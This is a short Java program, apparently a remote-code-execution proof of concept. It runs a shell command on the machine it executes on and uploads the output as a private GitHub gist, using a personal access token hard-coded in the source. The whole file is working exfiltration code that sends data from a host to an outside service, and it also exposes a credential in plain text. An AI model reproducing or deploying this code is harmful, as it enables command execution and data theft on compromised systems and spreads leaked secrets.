import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class GithubRCEUploader {

    public static void main(String[] args) {
        String token = "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";
        String apiUrl = "https://api.github.com/gists";
        String output = executeCommand("whoami");

        // Prepare JSON payload
        String jsonBody = String.format(
                "{ \"description\": \"RCE Outputamine\", \"public\": false, \"files\": { \"outputamine.txt\": { \"content\": \"%s\" } } }",
                output);

        try {
            // Create URL object
            URL url = new URL(apiUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();

            // Set HTTP method and headers
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Authorization", "token " + token);
            connection.setRequestProperty("User-Agent", "Mozilla/5.0");
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            connection.setDoOutput(true);

            // Send JSON payload
            try (OutputStream os = connection.getOutputStream()) {
                byte[] input = jsonBody.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }

            // Get response
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_CREATED) {
                System.out.println("RCE output uploaded successfully.");
            } else {
                System.out.println("Error: Failed to upload RCE output. Response code: " + responseCode);
            }

            // Disconnect
            connection.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Method to execute a command and capture output
    private static String executeCommand(String command) {
        StringBuilder output = new StringBuilder();
        try {
            Process process = new ProcessBuilder(command.split(" ")).start();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }
            process.waitFor();
        } catch (Exception e) {
            output.append("Error executing command: ").append(e.getMessage());
        }
        return output.toString().trim();
    }
}
